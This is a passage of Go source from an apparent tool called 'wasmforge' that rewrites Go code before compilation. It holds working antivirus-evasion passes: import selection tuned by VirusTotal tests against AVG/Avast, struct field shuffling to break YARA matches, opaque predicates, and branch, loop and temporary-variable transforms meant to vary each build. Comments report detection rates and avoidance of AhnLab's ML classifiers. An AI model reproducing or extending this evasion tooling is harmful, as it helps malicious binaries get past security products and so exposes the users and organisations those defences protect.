	{"crypt32.dll", []string{"CertOpenStore", "CertCloseStore", "CryptStringToBinaryW", "CertFindCertificateInStore"}},
	{"secur32.dll", []string{"GetUserNameExW", "AcquireCredentialsHandleW", "InitializeSecurityContextW"}},
	{"iphlpapi.dll", []string{"GetAdaptersAddresses", "GetTcpTable", "GetIpForwardTable", "GetBestRoute"}},
}

// SelectDiverseImports selects 3 DLLs with 1-3 functions each.
// crypt32.dll is always included first — VT testing (2026-04-09, n=20) showed
// every DLL combo containing crypt32 was 100% clean on AVG/Avast.
// The remaining 2 DLLs are randomly selected from the rest of the pool.
// VT batch testing (25 samples, 2026-03-18) showed 5 enriched DLLs → 100%
// AVG/Avast detection, 3 DLLs → 0% detection.
func SelectDiverseImports() []importDiversityEntry {
	count := 3 // Fixed at 3 — higher counts trigger AVG/Avast Win64:Evo-gen

	// Find crypt32 index and build remaining pool.
	crypt32Idx := -1
	var otherIndices []int
	for i, entry := range importDiversityPool {
		if entry.DLL == "crypt32.dll" {
			crypt32Idx = i
		} else {
			otherIndices = append(otherIndices, i)
		}
	}

	// Shuffle remaining pool.
	for i := len(otherIndices) - 1; i > 0; i-- {
		j := cryptoRandN(i + 1)
		otherIndices[i], otherIndices[j] = otherIndices[j], otherIndices[i]
	}

	// Build result: crypt32 first, then 2 random others.
	var indices []int
	if crypt32Idx >= 0 {
		indices = append(indices, crypt32Idx)
	}
	for _, idx := range otherIndices {
		if len(indices) >= count {
			break
		}
		indices = append(indices, idx)
	}

	var result []importDiversityEntry
	for _, idx := range indices {
		entry := importDiversityPool[idx]
		// Select 1-3 functions from this DLL.
		funcCount := 1 + cryptoRandN(3)
		if funcCount > len(entry.Funcs) {
			funcCount = len(entry.Funcs)
		}
		// Shuffle functions.
		funcs := make([]string, len(entry.Funcs))
		copy(funcs, entry.Funcs)
		for j := len(funcs) - 1; j > 0; j-- {
			k := cryptoRandN(j + 1)
			funcs[j], funcs[k] = funcs[k], funcs[j]
		}
		result = append(result, importDiversityEntry{
			DLL:   entry.DLL,
			Funcs: funcs[:funcCount],
		})
	}
	return result
}

// ---------------------------------------------------------------------------
// Phase 9: Struct Field Reordering
// ---------------------------------------------------------------------------
//
// Shuffles struct field order using Fisher-Yates. Changes compiled field
// offsets, breaking byte-level YARA matches on struct access patterns.
// A struct with N fields accessed in M locations produces M different
// instruction offsets per permutation.

func (tc *hostTransformConfig) reorderStructFieldsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))

	// Pass 1: Scan ALL files in the package for struct types that are
	// initialized with positional (non-named) fields. Reordering such
	// structs would break compilation since positional literals depend
	// on field order. Must scan the entire package because a struct
	// defined in file A can be used positionally in file B.
	positionalStructs := make(map[string]bool)
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		fset := token.NewFileSet()
		parsed, err := parser.ParseFile(fset, f, data, 0)
		if err != nil {
			continue
		}
		ast.Inspect(parsed, func(n ast.Node) bool {
			cl, ok := n.(*ast.CompositeLit)
			if !ok || len(cl.Elts) == 0 {
				return true
			}
			// Check if any element is positional (not key:value).
			for _, elt := range cl.Elts {
				if _, isKV := elt.(*ast.KeyValueExpr); !isKV {
					// Extract type name.
					switch t := cl.Type.(type) {
					case *ast.Ident:
						positionalStructs[t.Name] = true
					case *ast.SelectorExpr:
						positionalStructs[t.Sel.Name] = true
					}
					return true
				}
			}
			return true
		})
	}

	// Pass 2: Reorder structs, skipping positionally-initialized ones.
	for _, f := range files {
		if err := tc.reorderStructFieldsInFile(f, positionalStructs); err != nil {
			return err
		}
	}
	return nil
}

func (tc *hostTransformConfig) reorderStructFieldsInFile(path string, positionalStructs map[string]bool) error {
	base := filepath.Base(path)
	if strings.HasPrefix(base, "zz_") || strings.HasPrefix(base, "generated_") {
		return nil
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Skip files using unsafe pointer arithmetic — field layout matters there.
	content := string(data)
	if strings.Contains(content, "unsafe.Offsetof") || strings.Contains(content, "unsafe.Sizeof") {
		return nil
	}

	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, data, parser.ParseComments)
	if err != nil {
		return nil // skip unparseable files
	}

	modified := false
	ast.Inspect(f, func(n ast.Node) bool {
		ts, ok := n.(*ast.TypeSpec)
		if !ok {
			return true
		}
		st, ok := ts.Type.(*ast.StructType)
		if !ok || st.Fields == nil {
			return true
		}

		fields := st.Fields.List
		if len(fields) < 3 {
			return true
		}

		// Skip structs with embedded (anonymous) fields.
		for _, field := range fields {
			if len(field.Names) == 0 {
				return true
			}
		}

		// Skip structs used with positional initialization.
		if positionalStructs[ts.Name.Name] {
			return true
		}

		// Skip structs with //wasmforge:noreorder or //go:nosplit directives.
		if ts.Doc != nil {
			for _, c := range ts.Doc.List {
				if strings.Contains(c.Text, "wasmforge:noreorder") || strings.Contains(c.Text, "go:nosplit") {
					return true
				}
			}
		}

		// Fisher-Yates shuffle field order.
		for i := len(fields) - 1; i > 0; i-- {
			j := cryptoRandN(i + 1)
			fields[i], fields[j] = fields[j], fields[i]
		}
		st.Fields.List = fields
		modified = true
		return true
	})

	if !modified {
		return nil
	}

	var buf bytes.Buffer
	if err := printer.Fprint(&buf, fset, f); err != nil {
		return err
	}
	return os.WriteFile(path, buf.Bytes(), 0o644)
}

// ---------------------------------------------------------------------------
// Phase 10: Opaque Predicates
// ---------------------------------------------------------------------------
//
// Injects always-true conditional branches that the Go compiler cannot
// statically evaluate (package-level variable prevents constant folding).
// Each build gets a different random seed, producing different branch
// patterns in the compiled .text section.

func (tc *hostTransformConfig) insertOpaquePredicatesInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	if len(files) == 0 {
		return nil
	}

	// Determine package name from first parseable file.
	pkgName := ""
	for _, f := range files {
		fset := token.NewFileSet()
		parsed, err := parser.ParseFile(fset, f, nil, parser.PackageClauseOnly)
		if err != nil {
			continue
		}
		pkgName = parsed.Name.Name
		break
	}
	if pkgName == "" {
		return nil
	}

	// Generate per-build seed variable (package-level, non-const so
	// the compiler cannot fold the predicate).
	seedName := tc.ghostOrGenerate()
	seedValue := cryptoRandN(1000000) + 1 // positive non-zero

	// Write seed to a dedicated file.
	seedFileName := tc.ghostOrGenerate()
	for strings.HasPrefix(seedFileName, "_") || strings.HasPrefix(seedFileName, ".") {
		seedFileName = "z" + seedFileName[1:]
	}
	seedFile := filepath.Join(dir, seedFileName+".go")
	seedContent := fmt.Sprintf("package %s\n\nvar %s = %d\n", pkgName, seedName, seedValue)
	if err := os.WriteFile(seedFile, []byte(seedContent), 0o644); err != nil {
		return err
	}

	// Process each Go file and inject opaque predicates.
	for _, f := range files {
		base := filepath.Base(f)
		if strings.HasPrefix(base, "zz_") || strings.HasPrefix(base, "generated_") {
			continue
		}
		if f == seedFile {
			continue
		}
		if err := tc.insertOpaquePredicatesInFile(f, seedName); err != nil {
			return err
		}
	}
	return nil
}

func (tc *hostTransformConfig) insertOpaquePredicatesInFile(path, seedName string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, data, parser.ParseComments)
	if err != nil {
		return nil // skip unparseable
	}

	// Collect all eligible blocks (function bodies, if/for bodies with 3+ stmts).
	// Skip switch/select bodies — their statements are CaseClause/CommClause
	// nodes that can only appear directly inside switch/select, not inside if-blocks.
	var eligibleBlocks []*ast.BlockStmt
	ast.Inspect(f, func(n ast.Node) bool {
		block, ok := n.(*ast.BlockStmt)
		if !ok || len(block.List) < 3 {
			return true
		}
		// Reject if any statement is a case/comm clause (switch/select body).
		for _, stmt := range block.List {
			switch stmt.(type) {
			case *ast.CaseClause, *ast.CommClause:
				return true
			}
		}
		eligibleBlocks = append(eligibleBlocks, block)
		return true
	})

	if len(eligibleBlocks) == 0 {
		return nil
	}

	modified := false
	for _, block := range eligibleBlocks {
		// ~10% injection rate (reduced from 20% — higher rates increase
		// code bloat without proportional CFG diversity benefit).
		if cryptoRandN(10) != 0 {
			continue
		}

		stmtCount := len(block.List)
		wrapLen := 1 + cryptoRandN(3) // wrap 1-3 contiguous statements
		if wrapLen >= stmtCount {
			wrapLen = stmtCount - 1
		}
		if wrapLen < 1 {
			continue
		}

		// Start after the first statement to avoid wrapping variable
		// declarations that surrounding code depends on.
		maxStart := stmtCount - wrapLen
		if maxStart < 1 {
			continue
		}
		start := 1 + cryptoRandN(maxStart)

		// Safety: skip if the wrapped range contains variable declarations
		// (:= or var), return statements, goto, or fallthrough. Wrapping
		// these in an if-block would break scoping or control flow.
		if stmtsContainDeclOrControlFlow(block.List[start : start+wrapLen]) {
			continue
		}

		// Build always-true condition.
		cond := buildOpaquePredicate(seedName)
		if cond == nil {
			continue
		}

		// Extract target statements.
		wrapped := make([]ast.Stmt, wrapLen)
		copy(wrapped, block.List[start:start+wrapLen])

		// No else branch — dead code in else blocks inflates code size and
		// triggers ML classifiers (AhnLab-V3). The if-without-else still
		// emits a conditional branch instruction that varies the CFG.
		ifStmt := &ast.IfStmt{
			Cond: cond,
			Body: &ast.BlockStmt{List: wrapped},
		}

		// Rebuild statement list with the wrapped range replaced by the if.
		newList := make([]ast.Stmt, 0, len(block.List)-wrapLen+1)
		newList = append(newList, block.List[:start]...)
		newList = append(newList, ifStmt)
		newList = append(newList, block.List[start+wrapLen:]...)
		block.List = newList
		modified = true
	}

	if !modified {
		return nil
	}

	var buf bytes.Buffer
	if err := printer.Fprint(&buf, fset, f); err != nil {
		return err
	}
	return os.WriteFile(path, buf.Bytes(), 0o644)
}

// buildOpaquePredicate returns a random always-true AST expression using
// the given package-level seed variable name. Three predicate families
// are used, each mathematically guaranteed to be true:
//
//	(x*x + x) % 2 == 0       — x²+x = x(x+1) is always even
//	(x | (x + 1)) != 0       — at least one bit set in consecutive ints
//	(x*x + x + 1) % 2 == 1   — x²+x is even, +1 makes it odd
func buildOpaquePredicate(seedName string) ast.Expr {
	seed := func() *ast.Ident { return ast.NewIdent(seedName) }
	intLit := func(v string) *ast.BasicLit { return &ast.BasicLit{Kind: token.INT, Value: v} }

	switch cryptoRandN(3) {
	case 0: // (x*x + x) % 2 == 0
		xSq := &ast.BinaryExpr{X: seed(), Op: token.MUL, Y: seed()}
		sum := &ast.BinaryExpr{X: xSq, Op: token.ADD, Y: seed()}
		mod := &ast.BinaryExpr{X: &ast.ParenExpr{X: sum}, Op: token.REM, Y: intLit("2")}
		return &ast.BinaryExpr{X: mod, Op: token.EQL, Y: intLit("0")}

	case 1: // (x | (x + 1)) != 0
		xp1 := &ast.ParenExpr{X: &ast.BinaryExpr{X: seed(), Op: token.ADD, Y: intLit("1")}}
		or := &ast.ParenExpr{X: &ast.BinaryExpr{X: seed(), Op: token.OR, Y: xp1}}
		return &ast.BinaryExpr{X: or, Op: token.NEQ, Y: intLit("0")}

	case 2: // (x*x + x + 1) % 2 == 1
		xSq := &ast.BinaryExpr{X: seed(), Op: token.MUL, Y: seed()}
		sum := &ast.BinaryExpr{X: xSq, Op: token.ADD, Y: seed()}
		sum1 := &ast.BinaryExpr{X: sum, Op: token.ADD, Y: intLit("1")}
		mod := &ast.BinaryExpr{X: &ast.ParenExpr{X: sum1}, Op: token.REM, Y: intLit("2")}
		return &ast.BinaryExpr{X: mod, Op: token.EQL, Y: intLit("1")}
	}
	return nil
}

// stmtsContainDeclOrControlFlow reports whether any statement in the slice
// contains a short variable declaration (:=), var declaration, return,
// goto, or fallthrough. Wrapping such statements in an opaque predicate
// if-block would break scoping or control flow.
//
// Note: break and continue are intentionally excluded — they remain
// semantically valid inside an always-true if-block (they still apply
// to the enclosing loop/switch).
func stmtsContainDeclOrControlFlow(stmts []ast.Stmt) bool {
	for _, stmt := range stmts {
		found := false
		ast.Inspect(stmt, func(n ast.Node) bool {
			if found {
				return false
			}
			switch s := n.(type) {
			case *ast.AssignStmt:
				if s.Tok == token.DEFINE {
					found = true
				}
			case *ast.DeclStmt:
				found = true
			case *ast.ReturnStmt:
				found = true
			case *ast.BranchStmt:
				if s.Tok == token.GOTO || s.Tok == token.FALLTHROUGH {
					found = true
				}
			}
			return !found
		})
		if found {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Phase 11: Source-Level AST Transforms
// ---------------------------------------------------------------------------
//
// Applies safe source-level transforms that change the compiled control flow
// graph without changing semantics:
//   - 11a: Branch flipping — swap if/else bodies and negate condition
//   - 11b: Temporary variable extraction — split complex call args into steps
//   - 11c: Loop direction inversion — reverse order-independent loops

func (tc *hostTransformConfig) transformCodePatternsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	for _, f := range files {
		if err := tc.transformCodePatternsInFile(f); err != nil {
			return err
		}
	}
	return nil
}

func (tc *hostTransformConfig) transformCodePatternsInFile(path string) error {
	base := filepath.Base(path)
	if strings.HasPrefix(base, "zz_") || strings.HasPrefix(base, "generated_") {
		return nil
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, path, data, parser.ParseComments)
	if err != nil {
		return nil // skip unparseable
	}

	modified := false

	// --- 11a: Branch Flipping ---
	// For if/else statements, 50% chance to negate condition and swap bodies.
	ast.Inspect(f, func(n ast.Node) bool {
		ifStmt, ok := n.(*ast.IfStmt)
		if !ok || ifStmt.Else == nil {
			return true
		}
		// Only flip if else is a plain block (not else-if chain).
		elseBlock, ok := ifStmt.Else.(*ast.BlockStmt)
		if !ok {
			return true
		}
		// 50% chance to flip.
		if cryptoRandN(2) != 0 {
			return true
		}
		origBody := ifStmt.Body
		origLbrace := origBody.Lbrace
		origElseLbrace := elseBlock.Lbrace

		ifStmt.Cond = negateCond(ifStmt.Cond)
		ifStmt.Body = elseBlock
		ifStmt.Else = origBody

		// Swap Lbrace positions so the printer preserves line formatting.
		// Without this, a comment between the condition and the original
		// opening brace (e.g., `if cond /* comment */ {`) causes printer.Fprint
		// to emit the `{` on the next line after the comment, which is invalid Go.
		ifStmt.Body.Lbrace = origLbrace
		ifStmt.Else.(*ast.BlockStmt).Lbrace = origElseLbrace
		modified = true
		return true
	})

	// --- 11c: Loop Direction Inversion ---
	// For standard ascending for-loops, 20% chance to reverse direction.
	ast.Inspect(f, func(n ast.Node) bool {
		forStmt, ok := n.(*ast.ForStmt)
		if !ok {
			return true
		}
		if cryptoRandN(5) != 0 {
			return true
		}
		if invertForLoop(forStmt) {
			modified = true
		}
		return true
	})

	// --- 11b: Temporary Variable Extraction ---
	// For call expressions with complex arguments, extract into temp vars.
	ast.Inspect(f, func(n ast.Node) bool {
		block, ok := n.(*ast.BlockStmt)
		if !ok {
			return true
		}
		if tc.extractTempsInBlock(block) {
			modified = true
		}
		return true
	})

	if !modified {
		return nil
	}

	var buf bytes.Buffer
	if err := printer.Fprint(&buf, fset, f); err != nil {
		return err
	}
	return os.WriteFile(path, buf.Bytes(), 0o644)
}

// negateCond returns the logical negation of a condition expression.
// For binary comparisons it flips the operator directly (== → !=, < → >=).
// For complex expressions it wraps in !().
func negateCond(cond ast.Expr) ast.Expr {
	if bin, ok := cond.(*ast.BinaryExpr); ok {
		negOp := map[token.Token]token.Token{
			token.EQL: token.NEQ,
			token.NEQ: token.EQL,
			token.LSS: token.GEQ,
			token.GTR: token.LEQ,
			token.LEQ: token.GTR,
			token.GEQ: token.LSS,
		}
		if newOp, found := negOp[bin.Op]; found {
			return &ast.BinaryExpr{X: bin.X, Op: newOp, Y: bin.Y}
		}
	}
	return &ast.UnaryExpr{Op: token.NOT, X: &ast.ParenExpr{X: cond}}
}

// invertForLoop attempts to invert a standard ascending for-loop to
// descending. Returns true if the inversion was applied.
//
// Only inverts loops matching: for i := 0; i < N; i++ { ... }
// where the body doesn't use i as an array/slice index (conservative
// check to avoid changing iteration-order-dependent semantics).
func invertForLoop(forStmt *ast.ForStmt) bool {
	// Check Init: i := 0
	initAssign, ok := forStmt.Init.(*ast.AssignStmt)
	if !ok || initAssign.Tok != token.DEFINE {
		return false
	}
	if len(initAssign.Lhs) != 1 || len(initAssign.Rhs) != 1 {
		return false
	}
	indexIdent, ok := initAssign.Lhs[0].(*ast.Ident)
	if !ok {
		return false
	}
	initVal, ok := initAssign.Rhs[0].(*ast.BasicLit)
	if !ok || initVal.Kind != token.INT || initVal.Value != "0" {
		return false
	}

	// Check Cond: i < N
	condBin, ok := forStmt.Cond.(*ast.BinaryExpr)
	if !ok || condBin.Op != token.LSS {
		return false
	}
	condIdent, ok := condBin.X.(*ast.Ident)
	if !ok || condIdent.Name != indexIdent.Name {
		return false
	}
	bound := condBin.Y // upper bound expression (e.g., len(entries))

	// Check Post: i++
	postInc, ok := forStmt.Post.(*ast.IncDecStmt)
	if !ok || postInc.Tok != token.INC {
		return false
	}
	postIdent, ok := postInc.X.(*ast.Ident)
	if !ok || postIdent.Name != indexIdent.Name {
		return false
	}

	// Safety: skip if index variable is used in array/slice indexing.
	if bodyUsesIndexing(forStmt.Body, indexIdent.Name) {
		return false
	}

	// Invert: for i := N - 1; i >= 0; i--
	initAssign.Rhs[0] = &ast.BinaryExpr{
		X:  bound,
		Op: token.SUB,
		Y:  &ast.BasicLit{Kind: token.INT, Value: "1"},
	}
	forStmt.Cond = &ast.BinaryExpr{
		X:  ast.NewIdent(indexIdent.Name),
		Op: token.GEQ,
		Y:  &ast.BasicLit{Kind: token.INT, Value: "0"},
	}
	forStmt.Post = &ast.IncDecStmt{
		X:   ast.NewIdent(indexIdent.Name),
		Tok: token.DEC,
	}
	return true
}

// bodyUsesIndexing reports whether the given variable name appears as the
// index in any array/slice index expression within the block. Used as a
// conservative check before loop inversion.
func bodyUsesIndexing(body *ast.BlockStmt, indexName string) bool {
	found := false
	ast.Inspect(body, func(n ast.Node) bool {
		if found {
			return false
		}
		idx, ok := n.(*ast.IndexExpr)
		if !ok {
			return true
		}
		if ident, ok := idx.Index.(*ast.Ident); ok && ident.Name == indexName {
			found = true
		}
		return !found
	})
	return found
}

// extractTempsInBlock scans statements in a block for call expressions
// with complex arguments and extracts them into temporary variables.
// Each eligible statement has a 30% chance of being transformed.
func (tc *hostTransformConfig) extractTempsInBlock(block *ast.BlockStmt) bool {
	modified := false
	var newList []ast.Stmt

	for _, stmt := range block.List {
		// 30% chance to attempt extraction on this statement.
		if cryptoRandN(10) >= 3 {
			newList = append(newList, stmt)
			continue
		}

		extracted := tc.tryExtractTemps(stmt)
		if len(extracted) > 1 {
			modified = true
		}
		newList = append(newList, extracted...)
	}

	if modified {
		block.List = newList
	}
	return modified
}

// tryExtractTemps checks if a statement contains a call expression with
// complex arguments. If so, extracts each complex arg into a preceding
// temp variable assignment. Returns [tempDecl1, ..., modifiedStmt] or
// just [stmt] if no extraction was done.
func (tc *hostTransformConfig) tryExtractTemps(stmt ast.Stmt) []ast.Stmt {
	var callExpr *ast.CallExpr

	switch s := stmt.(type) {
	case *ast.AssignStmt:
		if len(s.Rhs) == 1 {
			if ce, ok := s.Rhs[0].(*ast.CallExpr); ok {
				callExpr = ce
			}
		}
	case *ast.ExprStmt:
		if ce, ok := s.X.(*ast.CallExpr); ok {
			callExpr = ce
		}
	}

	if callExpr == nil || len(callExpr.Args) < 2 {
		return []ast.Stmt{stmt}
	}

	// Skip variadic calls (trailing ...).
	if callExpr.Ellipsis.IsValid() {
		return []ast.Stmt{stmt}
	}

	// Find complex arguments and extract into temp vars.
	var result []ast.Stmt
	extracted := false

	for i, arg := range callExpr.Args {
		if !isComplexArg(arg) {
			continue
		}
		tmpName := tc.ghostOrGenerate()
		result = append(result, &ast.AssignStmt{
			Lhs: []ast.Expr{ast.NewIdent(tmpName)},
			Tok: token.DEFINE,
			Rhs: []ast.Expr{arg},
		})
		callExpr.Args[i] = ast.NewIdent(tmpName)
		extracted = true
	}

	if !extracted {
		return []ast.Stmt{stmt}
	}

	result = append(result, stmt)
	return result
}

// isComplexArg reports whether an expression is complex enough to warrant
// extraction into a temporary variable. Only function calls (including
// type conversions like uint32(x)) are extracted.
func isComplexArg(expr ast.Expr) bool {
	switch expr.(type) {
	case *ast.CallExpr:
		return true
	}
	return false
}

// transformASTOnly applies the safe subset of AST-level transforms to the
// wazero fork. Phase 9 (struct field reordering) and Phase 11 (branch flip /
// loop invert / temp extract) are intentionally skipped here because they
// corrupt the WASM decoder/interpreter in ways that produce non-deterministic
// runtime failures — e.g. "section custom: invalid section length: expected
// 114 but got 110", interpreter panics during InstantiateModule, and silent
// no-output exits. The transforms remain safe and active for the host code
// (applied via transformHostCode) where the surface is tested.
//
// Opt-in env vars are honored for experimentation:
//
//	WASMFORGE_WAZERO_STRUCT_REORDER=1 — re-enable struct reorder on wazero
//	WASMFORGE_WAZERO_CODEXFORM=1      — re-enable codexform on wazero
//
// The standard disable vars (WASMFORGE_NO_OPAQUE etc.) still honor "off".
func transformASTOnly(rootDir string) error {
	tc := &hostTransformConfig{
		wl:   newWordList(),
		used: make(map[string]bool),
	}

	// Collect all Go package directories.
	var pkgDirs []string
	filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || !info.IsDir() {
			return nil
		}
		entries, _ := filepath.Glob(filepath.Join(path, "*.go"))
		if len(entries) > 0 {
			pkgDirs = append(pkgDirs, path)
		}
		return nil
	})

	for _, dir := range pkgDirs {
		// Phase 9: Struct field reordering — disabled by default on wazero.
		// Reordering fields changes memory layout for reflection-based code
		// (wazero/internal/wasm/gofunc.go uses reflect.TypeOf/ValueOf) and
		// for any code that relies on declaration-order semantics.
		if os.Getenv("WASMFORGE_WAZERO_STRUCT_REORDER") == "1" &&
			os.Getenv("WASMFORGE_NO_STRUCT_REORDER") == "" {
			if err := tc.reorderStructFieldsInDir(dir); err != nil {
				return fmt.Errorf("reordering structs in %s: %w", dir, err)
			}
		}

		// Phase 10: Opaque predicates — safe; only inserts always-true
		// branches without altering control flow or data layout.
		if os.Getenv("WASMFORGE_NO_OPAQUE") == "" {
			if err := tc.insertOpaquePredicatesInDir(dir); err != nil {
				return fmt.Errorf("inserting opaque predicates in %s: %w", dir, err)
			}
		}

		// Phase 11: Branch flip / loop invert / temp extract — disabled by
		// default on wazero. invertForLoop reverses iteration order for any
		// `for i := 0; i < N; i++` whose body doesn't index by i, which
		// breaks decoders that produce ordered output (e.g., section parse
		// loops that append to slices), and negateCond plus body swap can
		// alter short-circuit semantics that the decoder depends on.
		if os.Getenv("WASMFORGE_WAZERO_CODEXFORM") == "1" &&
			os.Getenv("WASMFORGE_NO_CODEXFORM") == "" {
			if err := tc.transformCodePatternsInDir(dir); err != nil {
				return fmt.Errorf("transforming code patterns in %s: %w", dir, err)
			}
		}
	}

	return nil
}
